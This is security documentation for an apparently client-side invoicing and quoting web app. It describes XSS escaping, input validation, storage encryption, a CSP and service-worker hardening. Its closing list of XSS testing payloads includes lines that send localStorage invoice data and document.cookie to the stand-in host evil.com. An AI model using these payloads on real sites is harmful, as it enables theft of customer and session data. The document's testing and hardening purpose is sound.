# TicTacStick Security Documentation

## 🔒 Security Overview

TicTacStick handles **sensitive financial and customer data** including:
- Customer PII (names, emails, phones, addresses)
- Financial records (invoices, payments, quotes)
- Business banking information (BSB, account numbers, ABN)
- Pricing strategies and business intelligence

This document outlines the security measures implemented to protect this data.

---

## ✅ Security Measures Implemented

### 1. **XSS (Cross-Site Scripting) Prevention**

**Status:** ✅ **IMPLEMENTED**

#### What We Protected Against:
- Malicious scripts injected via user input fields
- HTML injection in client names, notes, addresses
- Script execution in exported quotes and invoices

#### Implementation:

**Security Module:** `/security.js`

All user input is sanitized before display using:

```javascript
// Escape HTML entities
window.Security.escapeHTML(userInput);

// Sanitize with line breaks (for notes)
window.Security.sanitizeWithLineBreaks(clientNotes);

// Safe text insertion (preferred method)
window.Security.setTextSafely(element, userInput);
```

#### Files Updated:
- ✅ `app.js` - Quote export, window/pressure line titles, client data (lines 1033, 1036, 1092, 1098, 1101, 1104, 1208, 1212, 1216, 1185)
- ✅ `analytics.js` - Client name display (line 288)
- ✅ `security.js` - Sanitization utilities added

#### Test Coverage:
- `tests/security.spec.js` - XSS prevention tests

---

### 2. **Input Validation**

**Status:** 🟡 **PARTIALLY IMPLEMENTED** (utilities ready, integration pending)

#### What We Protected Against:
- Infinity/NaN in numeric calculations
- Negative values in counts/amounts
- Numeric overflow attacks
- Invalid email/phone formats
- Excessive string lengths
- Format injection attacks

#### Implementation:

**Validation Utilities:** `/security.js`

```javascript
// Numeric validation
var validated = window.Security.validateNumber(userInput, {
  min: 0,
  max: 10000,
  decimals: 2,
  allowNegative: false,
  fallback: 0,
  fieldName: 'Hourly Rate'
});

// Currency validation
var amount = window.Security.validateCurrency(value, 'Payment Amount');

// String validation
var email = window.Security.validateEmail(emailInput);
var phone = window.Security.validatePhone(phoneInput);
var bsb = window.Security.validateBSB(bsbInput);
var abn = window.Security.validateABN(abnInput);
```

#### Status by Category:

**✅ Implemented:**
- Number validation utilities (validateNumber, validateCurrency, validatePositiveInteger)
- String validation utilities (validateString, validateEmail, validatePhone, validateBSB, validateABN)

**⚠️ Pending Integration:**
- Apply validation to all form inputs in `app.js` (lines 108-125)
- Apply validation to invoice payment inputs in `invoice.js` (line 230)
- Apply validation to invoice editing in `invoice.js` (lines 1581-1583)
- Apply validation to client database in `client-database.js` (lines 48-49)

---

### 3. **LocalStorage Encryption**

**Status:** 🟡 **READY TO IMPLEMENT** (utilities available, migration needed)

#### What We Protected Against:
- Plaintext customer data accessible via DevTools
- Browser extension data theft
- Physical device access data exposure
- XSS data exfiltration

#### Current Risk:
🔴 **CRITICAL:** All sensitive data currently stored in plaintext:
- `invoice-database` - Customer financial records
- `invoice-settings` - Business banking credentials
- `client-database` - Customer PII database

#### Implementation Available:

**Simple Encryption (XOR):**
```javascript
// Set encryption key (per session)
window.Security.SecureStorage.setKey('user-password-2025');

// Encrypt and store
window.Security.SecureStorage.setItem('invoice-database', invoices);

// Decrypt and retrieve
var invoices = window.Security.SecureStorage.getItem('invoice-database', []);
```

**Advanced Encryption (AES-256-GCM via Web Crypto API):**
```javascript
// Initialize with password
await window.Security.SecureStorageAdvanced.init('user-password');

// Encrypt and store (async)
await window.Security.SecureStorageAdvanced.setItem('invoice-database', invoices);

// Decrypt and retrieve (async)
var invoices = await window.Security.SecureStorageAdvanced.getItem('invoice-database', []);
```

#### Migration Plan:

**Phase 1 - Critical Data (Week 1):**
1. `invoice-settings` - Banking credentials
2. `client-database` - Customer PII
3. `invoice-database` - Financial records

**Phase 2 - Business Data (Week 2):**
4. `quote-history` - Historical quotes
5. `tictacstick_autosave_state_v1` - Active quotes
6. `quoteTemplates` - Pricing strategies

#### Key Management Strategy:

**Option 1: Session-Based (Recommended for PWA)**
- User enters password on app launch
- Key derived from password using PBKDF2
- Key stored in memory only (cleared on close)
- Re-prompt after inactivity timeout

**Option 2: Persistent (Less Secure)**
- Derive key from device ID + timestamp
- Store key hash in LocalStorage
- Automatic unlock (no password needed)
- Risk: Key accessible if device compromised

---

### 4. **Content Security Policy (CSP)**

**Status:** ✅ **IMPLEMENTED**

#### What We Protected Against:
- Unauthorized external scripts
- Inline script injection
- Clickjacking attacks
- Data exfiltration to external domains

#### Implementation:

**File:** `index.html` (lines 11-24)

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:;
  font-src 'self';
  connect-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
">
```

#### CSP Directives Explained:

- `default-src 'self'` - Only load resources from same origin
- `script-src 'self' 'unsafe-inline'` - Allow same-origin scripts + inline (required for ES5)
- `style-src 'self' 'unsafe-inline'` - Allow same-origin styles + inline CSS
- `img-src 'self' data: blob:` - Allow images from origin + data URLs + blobs (for photos)
- `connect-src 'self'` - Only connect to same origin (future API calls)
- `object-src 'none'` - Block Flash/Java applets
- `frame-ancestors 'none'` - Prevent clickjacking
- `upgrade-insecure-requests` - Force HTTPS in production

#### Future Hardening (Production):

When moving to production:
1. Remove `'unsafe-inline'` from script-src
2. Add nonce for necessary inline scripts
3. Add API domain to `connect-src` when backend is deployed
4. Add CSP reporting endpoint

---

### 5. **Service Worker Security**

**Status:** ✅ **HARDENED**

#### What We Protected Against:
- Cache poisoning attacks
- Cross-origin resource caching
- Malicious cache injection
- Service Worker persistence attacks

#### Implementation:

**File:** `sw.js` (completely rewritten)

**Security Features:**

1. **Origin Verification:**
```javascript
// Only intercept same-origin requests
if (url.origin !== location.origin) {
  return; // Let browser handle external requests
}
```

2. **Path Whitelisting:**
```javascript
var ALLOWED_PATHS = [
  /^\/$/,
  /^\/index\.html$/,
  /^\/.*\.js$/,
  /^\/.*\.css$/,
  // Explicit patterns only
];
```

3. **Cache Validation:**
```javascript
// Only cache successful, same-origin responses
if (response.status !== 200) return response;
if (response.type !== 'basic' && response.type !== 'cors') return response;
if (!isSafeToCacheUrl(requestUrl)) return response;
```

4. **Manual Cache Clearing:**
```javascript
// From browser console:
navigator.serviceWorker.controller.postMessage({ action: 'clearCache' });
```

5. **Immediate Updates:**
```javascript
// Force new service worker to take control immediately
self.clients.claim();
```

#### Service Worker Debugging:

**Chrome DevTools:**
1. Open DevTools → Application → Service Workers
2. Check "Update on reload" during development
3. Click "Unregister" to remove service worker
4. Click "Clear storage" to wipe cache

**Manual Unregister (JavaScript):**
```javascript
navigator.serviceWorker.getRegistrations().then(function(registrations) {
  for (var registration of registrations) {
    registration.unregister();
  }
});
```

---

### 6. **Safe JSON Parsing**

**Status:** 🟡 **READY TO IMPLEMENT** (utilities available, integration pending)

#### What We Protected Against:
- App crashes from corrupted LocalStorage
- Malformed JSON injection
- Type confusion attacks
- Schema validation bypass

#### Implementation:

**Utilities:** `/security.js`

```javascript
// Safe parsing with fallback
var data = window.Security.safeJSONParse(json, schema, fallbackValue);

// Schema validation
var schema = {
  invoices: 'array',
  settings: 'object',
  total: 'number'
};

var validated = window.Security.validateSchema(parsedData, schema);
```

#### Files Needing Update:

Currently **VULNERABLE** - using unsafe `JSON.parse()`:
- ❌ `invoice.js:34` - Invoice database load
- ❌ `client-database.js:14` - Client database load
- ❌ `analytics.js:80` - Quote history load
- ❌ `templates.js:338` - Templates load
- ❌ `import-export.js:90` - Backup file import

**Required Changes:**
Replace all instances of:
```javascript
var data = JSON.parse(localStorage.getItem(key));
```

With:
```javascript
var data = window.Security.safeJSONParse(
  localStorage.getItem(key),
  { expectedField: 'array' }, // Schema
  [] // Fallback
);
```

---

## 🚨 Known Vulnerabilities & Mitigation Status

### Critical (Fix Immediately)

| Vulnerability | Location | Status | Priority |
|---------------|----------|--------|----------|
| Unprotected JSON.parse() | invoice.js:34 | 🟡 Utilities ready | **P0** |
| Infinity in payment amounts | invoice.js:230 | 🟡 Utilities ready | **P0** |
| Plaintext banking credentials | LocalStorage: invoice-settings | 🟡 Encryption ready | **P0** |
| Plaintext customer PII | LocalStorage: client-database | 🟡 Encryption ready | **P0** |

### High Priority (Fix Within 1 Week)

| Vulnerability | Location | Status | Priority |
|---------------|----------|--------|----------|
| Negative panes/area validation | app.js:400, 630 | 🟡 Utilities ready | **P1** |
| No maximum bounds on inputs | All numeric inputs | 🟡 Utilities ready | **P1** |
| Infinity in invoice editing | invoice.js:1581 | 🟡 Utilities ready | **P1** |

### Medium Priority (Fix Within 1 Month)

| Vulnerability | Location | Status | Priority |
|---------------|----------|--------|----------|
| Email/phone format validation | client-database.js:48 | 🟡 Utilities ready | **P2** |
| BSB/ABN format validation | invoice.js:705 | 🟡 Utilities ready | **P2** |
| String length limits | All text inputs | 🟡 Utilities ready | **P2** |

---

## 📋 Security Implementation Checklist

### Immediate Actions (This Week)

- [x] Create security utilities module (`security.js`)
- [x] Add CSP meta tag to `index.html`
- [x] Fix critical XSS vulnerabilities in `app.js`
- [x] Fix XSS in `analytics.js`
- [x] Harden Service Worker
- [x] Create security test suite
- [ ] **Apply safe JSON parsing to all LocalStorage reads**
- [ ] **Implement encryption for critical data (invoice-settings, client-database)**
- [ ] **Add input validation to payment amounts**

### This Month

- [ ] Integrate input validation across all forms
- [ ] Implement LocalStorage encryption for all sensitive data
- [ ] Add audit logging for sensitive operations
- [ ] Implement session timeout / auto-lock
- [ ] Add data retention policies
- [ ] Review and remove 'unsafe-inline' from CSP

### Future (Phase 3 - API Integration)

- [ ] Implement HTTPS-only mode
- [ ] Add CORS configuration
- [ ] Never expose API keys in client code
- [ ] Use short-lived JWT tokens
- [ ] Implement rate limiting
- [ ] Validate all API responses
- [ ] Add request signing
- [ ] Implement OAuth 2.0 if needed

---

## 🔧 Using Security Utilities

### Import in Your Module:

The `security.js` module is loaded globally before other modules. Access via:

```javascript
// Full namespace
window.Security.escapeHTML(userInput);

// Shorthand alias
window.Sec.validateEmail(email);
```

### XSS Prevention:

**Escaping user input for HTML insertion:**
```javascript
var safeName = window.Security.escapeHTML(clientName);
document.getElementById('output').innerHTML = '<div>' + safeName + '</div>';
```

**Safe text insertion (preferred):**
```javascript
var element = document.getElementById('clientName');
window.Security.setTextSafely(element, clientName);
// Equivalent to: element.textContent = clientName;
```

**Multi-line text with line breaks:**
```javascript
var safeNotes = window.Security.sanitizeWithLineBreaks(clientNotes);
// Escapes HTML, then converts \n to <br/>
```

### Input Validation:

**Numeric inputs:**
```javascript
// Validate hourly rate
var hourlyRate = window.Security.validateNumber(userInput, {
  min: 0,
  max: 500,
  decimals: 2,
  allowNegative: false,
  fallback: 95,
  fieldName: 'Hourly Rate'
});

// Validate currency
var amount = window.Security.validateCurrency(input, 'Payment Amount');

// Validate positive integer
var panes = window.Security.validatePositiveInteger(input, 1, 100, 'Pane Count');
```

**String inputs:**
```javascript
// Validate email
var email = window.Security.validateEmail(emailInput);
if (!email) {
  alert('Invalid email format');
}

// Validate phone
var phone = window.Security.validatePhone(phoneInput);

// Validate with custom rules
var notes = window.Security.validateString(input, {
  maxLength: 500,
  trim: true,
  allowEmpty: true,
  pattern: /^[a-zA-Z0-9\s.,!?-]*$/, // Alphanumeric + punctuation only
  fieldName: 'Notes'
});
```

### Encryption:

**Simple encryption (XOR):**
```javascript
// Set encryption key (once per session)
window.Security.SecureStorage.setKey('user-password-2025');

// Store encrypted data
window.Security.SecureStorage.setItem('sensitiveData', {
  accountNumber: '123456789',
  bsb: '123-456'
});

// Retrieve decrypted data
var data = window.Security.SecureStorage.getItem('sensitiveData', null);
```

**Advanced encryption (Web Crypto API - async):**
```javascript
// Initialize (once per session)
await window.Security.SecureStorageAdvanced.init('user-password');

// Store (async)
await window.Security.SecureStorageAdvanced.setItem('banking', bankingData);

// Retrieve (async)
var banking = await window.Security.SecureStorageAdvanced.getItem('banking', null);
```

### Safe JSON Parsing:

```javascript
// Basic safe parsing
var data = window.Security.safeJSONParse(jsonString, null, []);

// With schema validation
var schema = {
  invoices: 'array',
  settings: 'object',
  total: 'number'
};

var invoices = window.Security.safeJSONParse(
  localStorage.getItem('invoice-database'),
  schema,
  [] // Fallback if parsing or validation fails
);
```

---

## 🧪 Running Security Tests

### Full Security Test Suite:

```bash
# Run all security tests
npx playwright test tests/security.spec.js

# Run specific test group
npx playwright test tests/security.spec.js -g "XSS Prevention"

# Run with debugging
npx playwright test tests/security.spec.js --debug
```

### Manual Security Testing:

**Test XSS Prevention:**
1. Open app in browser
2. Enter these payloads in input fields:
   ```
   <script>alert('XSS')</script>
   <img src=x onerror=alert('XSS')>
   <svg onload=alert('XSS')>
   "><script>alert('XSS')</script>
   ```
3. Export quote or view in client database
4. Verify no alerts execute
5. Inspect HTML - should see escaped entities: `&lt;script&gt;`

**Test Input Validation:**
1. Try entering `Infinity` in hourly rate
2. Try entering `-5` in pane count
3. Try entering `999999999` in base fee
4. Verify all are rejected or clamped

**Test Service Worker Security:**
1. Open DevTools → Application → Service Workers
2. Verify only whitelisted files are cached
3. Check Cache Storage - should only contain app files
4. Verify no external URLs cached

---

## 📖 Security Best Practices

### For Developers:

1. **Never trust user input** - Always validate and sanitize
2. **Use `window.Security` utilities** - Don't roll your own crypto
3. **Escape before display** - Use `escapeHTML()` for all user data
4. **Validate on input AND save** - Double validation prevents bypasses
5. **Test with malicious payloads** - Use XSS cheat sheets
6. **Review localStorage writes** - Encrypt sensitive data before storage
7. **Check Service Worker cache** - Verify only app files are cached
8. **Never log sensitive data** - Use `sanitizeForLogging()`

### For Production Deployment:

1. **Enable HTTPS only** - No HTTP allowed
2. **Tighten CSP** - Remove 'unsafe-inline', use nonces
3. **Implement session timeouts** - Auto-lock after 15 min inactivity
4. **Add audit logging** - Log all sensitive operations
5. **Regular security audits** - Quarterly penetration testing
6. **Keep dependencies updated** - Monitor for vulnerabilities
7. **Implement backup encryption** - Don't export plaintext backups
8. **Add CSP reporting** - Monitor CSP violations

---

## 🆘 Incident Response

### If XSS Attack Detected:

1. **Immediate:** Clear all LocalStorage: `localStorage.clear()`
2. **Immediate:** Unregister Service Worker (see instructions above)
3. **Investigate:** Check browser DevTools Console for injected scripts
4. **Patch:** Identify injection point and apply `escapeHTML()`
5. **Test:** Verify fix with malicious payload
6. **Deploy:** Push hotfix immediately
7. **Notify:** Inform users to clear cache and reload

### If Data Breach Suspected:

1. **Isolate:** Stop using the app immediately
2. **Assess:** Determine what data was exposed
3. **Encrypt:** Implement LocalStorage encryption immediately
4. **Rotate:** Change all banking credentials
5. **Notify:** Inform affected customers (legal requirement)
6. **Audit:** Full security review of entire codebase
7. **Remediate:** Fix all vulnerabilities before relaunch

---

## 📚 Additional Resources

### Security References:

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API)
- [Service Worker Security](https://developer.chrome.com/docs/workbox/service-worker-security/)

### XSS Testing Payloads:

```html
<!-- Basic payloads -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Attribute injection -->
"><script>alert('XSS')</script>
' onclick=alert('XSS') '

<!-- Event handlers -->
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>

<!-- Data exfiltration -->
<script>fetch('https://evil.com?data='+localStorage.getItem('invoice-database'))</script>

<!-- DOM-based XSS -->
<img src=x onerror="document.location='https://evil.com?cookie='+document.cookie">
```

---

## ✅ Security Compliance

### Australian Privacy Principles (APP):

- ✅ **APP 11.1:** Taking reasonable steps to protect personal information
  - Implemented: XSS prevention, input validation, CSP
  - Pending: LocalStorage encryption

- ⚠️ **APP 11.2:** Destruction of personal information no longer needed
  - Pending: Implement data retention policies and auto-deletion

### Payment Card Industry (PCI DSS):

**Note:** TicTacStick does NOT store credit card numbers. If adding payment processing:

- Never store CVV codes
- Encrypt cardholder data (AES-256 minimum)
- Use tokenization for card storage
- Implement access controls
- Log all payment operations

---

**Last Updated:** 2025-11-17
**Security Version:** 1.0.0
**Next Review:** 2025-12-01
